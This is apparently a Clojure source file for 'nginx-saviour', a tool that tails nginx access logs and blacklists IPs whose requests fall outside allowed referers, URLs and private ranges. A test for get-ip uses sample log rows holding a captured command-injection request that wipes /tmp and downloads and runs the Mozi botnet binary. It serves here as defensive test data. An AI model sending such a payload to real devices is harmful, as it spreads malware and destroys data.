(ns nginx-saviour.core
  (:require [taoensso.timbre :as log]
            [clojure.java.io :as io]
            [clj-time.format :as f]
            [clojure.test :refer [is]]
            [clojure.core.async :as async]
            [clojure-watch.core :refer [start-watch]]
            [clojure.java.shell :refer [sh]])
  (:gen-class))

(defn exists?
  [file]
  (.exists (io/as-file file)))

(defn print-exit
  [msg]
  (println msg)
  (System/exit 0))

(def message-channel (async/chan))
(def error-channel (async/chan))

(defonce banned-ip-list-atom (atom #{}))
(defonce watch-atom (atom nil))
(defonce config-atom (atom nil))

(defn get-config
  [prop]
  (get-in (deref config-atom) (if (vector? prop) prop [prop])))

(defn in?
  "x is in xs?"
  [xs x]
  (some (fn [xx] (= x xx)) xs))

(def fields [:remote-addr :remote-user :time :request :status :body-bytes-sent :http-referer :http-user-agent :original])

(defn remove-bracets
  [s]
  (clojure.string/replace s #"\[|\]" ""))

(defn get-date-from-log-row
  "Extracts the date inside bracets from a log row. It validates that the first field is an ip, then a remote user."
  [row]
  (->> (re-find #"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}\s-(.*)-\s\[\d{2}\/\w{3}\/\d{4}:\d{2}:\d{2}:\d{2}\s\+\d{4}]\s" row)
       first
       (re-find #"\[.*\]")))

(defn str->pattern
  "Convert a string into a regex pattern, i.e escaping stuff."
  [string]
  (let [regex-char-esc-smap (let [esc-chars "[]()&^%$#!?*.+"]
                              (zipmap esc-chars
                                      (map #(str "\\" %) esc-chars)))]
    (->> string
         (replace regex-char-esc-smap)
         (reduce str)
         re-pattern)))

(defn remove-date
  "Remove the date [...] from a log row because I'm unable to exclude that when splitting on spaces.....:)"
  [row]
  (as-> (get-date-from-log-row row) $
        (str->pattern $)
        (clojure.string/replace row $ "")))

(defn split-row-on-space
  "Splits a row on spaces but keeps spaces that is inside quotes"
  [row]
  (clojure.string/split row #"\s+(?=([^\"]*\"[^\"]*\")*[^\"]*$)"))

(def ^:dynamic *timestamp-format* "dd/MMM/yyy:HH:mm:ss Z")

(defn parse-datetime [timestamp]
  (f/parse (f/formatter *timestamp-format*) timestamp))

(defn parse-request
  "Parse the request entry in a log row"
  {:test (fn []
           (is (= (parse-request "GET /portal/redlion HTTP/1.1") {:http-method "GET" :url "/portal/redlion" :protocol "HTTP/1.1"})))}
  [request]
  (try
    (let [parsed (re-find #"(.+) (.*) (HTTP\/?\d?\.?\d?)" request)]
      {:http-method (nth parsed 1)
       :url         (nth parsed 2)
       :protocol    (last parsed)})
    (catch Exception e
      (log/error "Invalid request - " e - request)
      {:http-method nil
       :url         nil
       :protocol    nil})))

(defn get-ip
  "Finds an IP in a raw log row"
  {:test (fn []
           (let [row "202.83.44.98 - - [23/Sep/2020:10:14:51 +0000] \"GET /shell?cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1\" 1233 162 \"-\" \"Hello, world\""
                 row2 " - - [23/Sep/2020:10:14:51 +0000] \"GET /shell?cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+202.83.44.98jaws HTTP/1.1\" 1233 162 \"-\" \"Hello, world\""]
             (is (= (get-ip row) "202.83.44.98"))
             (is (= (get-ip row2) nil))))}
  [row]
  (when-not (nil? row)
    (->> row
         (re-find #"^(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})")
         first)))

(defn parse-row
  "excepts a default log row format
  '$remote_addr - $remote_user [$time_local] '\"$request\" $status $body_bytes_sent \"$http_referer\" \"$http_user_agent\"';"
  {:test (fn []
           (let [row "41.213.138.16 - - [23/Sep/2020:08:10:38 +0000] 7%3b%23&remoteSubmit=Save 400 166 - -"
                 process (parse-row row)]
             (is (= process
                    {:remote-addr     "41.213.138.16"
                     :remote-user     "-"
                     :time            (parse-datetime "23/Sep/2020:08:10:38 +0000")
                     :request         {:http-method nil
                                       :url         nil
                                       :protocol    nil}
                     :status          "400"
                     :body-bytes-sent "166"
                     :http-referer    "-"
                     :http-user-agent "-"
                     :original        row}))))}
  [row]
  (try
    (let [columns (-> (remove-date row) split-row-on-space)
          data (zipmap fields columns)]
      (-> data
          (assoc :time (-> row
                           get-date-from-log-row
                           remove-bracets
                           parse-datetime))
          (assoc :original row)
          (assoc :request (parse-request (:request data)))))
    (catch Exception e
      ;; do nothing..
      )))

(defn banned?
  [log-row]
  (in? (deref banned-ip-list-atom) (get-ip log-row)))

(defn valid-referer?
  "Just allow https for now, maybe inform about this..."
  {:test (fn []
           (is (= (valid-referer? "https://homepage.com" ["home.se" "homepage.com"]) true))
           (is (= (valid-referer? "homepag" ["home.se" "homepage.com"]) false))
           (is (= (valid-referer? "https://byggarn.erkanp.dev/static/57adca76/css/simple-page.theme.css" ["erkanp.dev" "byggarn.erkanp.dev"]) true)))}
  [https-referer valid-refs]
  (boolean (some (fn [r]
                   (->
                     (str "^(\"|')?https://" r "/?")
                     re-pattern
                     (re-find https-referer)
                     boolean)) valid-refs)))

(defn valid-url?
  "Check if a url is valid."
  [url]
  (let [valid-urls (get-config [:valid-urls :urls])
        valid-regex (get-config [:valid-urls :regex])]
    (cond
      (nil? url) false
      (in? valid-urls url) true
      (boolean (some (fn [regex-str] (-> regex-str re-pattern (re-find url))) valid-regex)) true
      :else false)))

(defn valid-ip?
  [ip regxp]
  (-> (re-pattern regxp)
      (re-matches ip)
      boolean))

(defn should-ban?
  "Validate against urls and https-referer"
  {:test (fn []
           (is (= (should-ban? {:http-referer "https://byggarn.erkanp.dev/static/57adca76/css/simple-page.theme.css"
                                :request      {:url "/asd"}}
                               {:valid-refs ["erkanp.dev" "byggarn.erkanp.dev"]})
                  false))
           (is (= (should-ban? {:remote-addr "192.168.1.1"}
                               {:valid-ip-regex ["(192)\\.(168)(\\.(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9][0-9]|[0-9])){2}"]})
                  false))
           (is (= (should-ban? {:remote-addr "192.167.1.1"}
                               {:valid-ip-regex ["(192)\\.(168)(\\.(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9][0-9]|[0-9])){2}"]})
                  true)))}
  [{:keys [http-referer request remote-addr]} {:keys [valid-refs valid-ip-regex]}]
  (let [ref-ok? (valid-referer? http-referer valid-refs)
        url-ok? (valid-url? (:url request))
        ip-ok? (-> (filter (partial valid-ip? remote-addr) valid-ip-regex)
                   empty?
                   not)]
    (cond
      ip-ok? false
      ref-ok? false
      url-ok? false
      :else true)))

(defn write-ips-to-file-nginx-style!
  "Spit all the banned ips to a file in a nginx way format"
  [ips]
  (let [ips (clojure.string/join " 1;\n " ips)]
    (spit (get-config :blacklist-output) (str "geo $bad_ip {\n default 0;\n " ips " 1;\n}"))))

(defn consume-log-rows-from-channel
  []
  (async/go-loop []
    (let [data (async/<! message-channel)]
      (if (banned? data)
        (do (log/info (str "Already banned |\t " (get-ip data)))
            (recur))
        (let [d (parse-row data)
              url (get-in d [:request :url])]
          (if (some? d)
            (when (should-ban? d (get-config :valid-https-referers))
              (log/info "Ban \t\t|\t" (:remote-addr d) (if (nil? url) "" (str (clojure.string/join (repeat (- 20 (count (:remote-addr d))) " ")) " | " (subs url 0 (min 30 (count url))) "...")))
              (swap! banned-ip-list-atom conj (:remote-addr d))
              (write-ips-to-file-nginx-style! (deref banned-ip-list-atom))
              (apply sh (->
                          (get-config :nginx-restart-cmd)
                          (clojure.string/split #" ")
                          (into []))))
            (log/info "Ignore parsing |\t" data))
          (recur))))))

(defn read-lines
  [file output-fn]
  (with-open [reader (io/reader file)]
    (doseq [line (line-seq reader)]
      (output-fn line))))

(defn tail-file!
  [file]
  (->
    (sh "tail" file)
    :out
    (clojure.string/split #"\n")))

(defn start-dir-watch
  [{:keys [path files-to-watch]}]
  (reset! watch-atom (start-watch [{:path        path
                                    :event-types [:create :modify]
                                    :bootstrap   (fn [_]
                                                   (doseq [f files-to-watch]
                                                     (read-lines f #(async/put! message-channel %))))
                                    :callback    (fn [event filename]
                                                   (println "EVENT" event filename)
                                                   (condp = event
                                                     ;; the log has rotated
                                                     :create (when (in? files-to-watch filename)
                                                               (doall
                                                                 (map (fn [line]
                                                                        (async/put! message-channel line))
                                                                      (tail-file! filename))))
                                                     :modify (when (in? files-to-watch filename)
                                                               (doall
                                                                 (map (fn [line]
                                                                        (async/put! message-channel line))
                                                                      (tail-file! filename))))

                                                     :delete nil
                                                     ))}])))
(defn stop-watch
  "Stop watching for directory changes."
  []
  (-> watch-atom
      deref
      (apply nil)))

(defn initialize-error-handling
  "Handle errors"
  []
  (async/go-loop []
    (let [{:keys [name message]} (async/<! error-channel)]
      (condp = name
        :file-not-found (print-exit message)
        :unable-to-parse (log/error message))
      (recur))))

(comment

  (let [config {
                ;; absolute path for files to watch
                :files-to-watch       ["/Users/erkan/code/nginx-saviour/logs/test.log"
                                       "/Users/erkan/code/nginx-saviour/logs/test1.log"]

                ;; directory where the logs are being rotated, each file inside <files-to-watch> must be inside this folder
                :log-rotate-directory "/Users/erkan/code/nginx-saviour/logs"

                ;; file to output blacklisted ips
                :blacklist-output     "blacklist.ip"

                ;; valid http referers, is https://..
                :valid-https-referers ["erkanp.dev" "byggarn.erkanp.dev"]

                ;; how to restart nginx after outputting blacklisted ips to <blacklist-output>
                :nginx-restart-cmd    "echo wohho"

                ;; loglevel timbre logging - :trace :debug :info :warn :error :fatal :report
                :log-level            :info

                ;; valid urls with regex, not to ban
                :valid-urls           {:urls  ["/" "/robots.txt" "/favicon.ico" "/sitemap.xml" "/api/ws/" "/api/v1/"]
                                       :regex ["^/\\.well-known/"]}

                :valid-ip-regex       [
                                       ;; class A
                                       "(10)(\\.([2]([0-5][0-5]|[01234][6-9])|[1][0-9][0-9]|[1-9][0-9]|[0-9])){3}"
                                       ;; class B
                                       "(172)\\.(1[6-9]|2[0-9]|3[0-1])(\\.(2[0-4][0-9]|25[0-5]|[1][0-9][0-9]|[1-9][0-9]|[0-9])){2}"
                                       ;; class C
                                       "(192)\\.(168)(\\.(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9][0-9]|[0-9])){2}"
                                       ]
                }
        ]

    (reset! config-atom config)
    )
  (stop-watch)
  (start-dir-watch {:path           (get-config :log-rotate-directory)
                    :files-to-watch (get-config :files-to-watch)})

  (consume-log-rows-from-channel)

  (start-dir-watch {:path      path
                    :file-name file-name})

  ;; superb!
  ;; https://www.initpals.com/nginx/how-to-block-requests-from-specific-ip-address-in-nginx/

  )

(defn -main
  " I don't do a whole lot ... yet but something now!. "
  [& args]

  (let [conf (apply hash-map args)
        config-file (get conf "--config")]
    (if (and (nil? config-file) (not (exists? config-file)))
      (print-exit (str "Unable to find config-file: " config-file " provide it with --config <file-name>.edn"))
      (let [conf (-> (slurp config-file) clojure.edn/read-string)]
        (reset! config-atom conf))))

  ;; set log-level
  (log/set-level! (get-config :log-level))

  ;; consume errors from error-channel
  (initialize-error-handling)

  ;; start to watch for changes in directory
  (start-dir-watch {:path           (get-config :log-rotate-directory)
                    :files-to-watch (get-config :files-to-watch)})

  ;; consume log data
  (consume-log-rows-from-channel)
  )


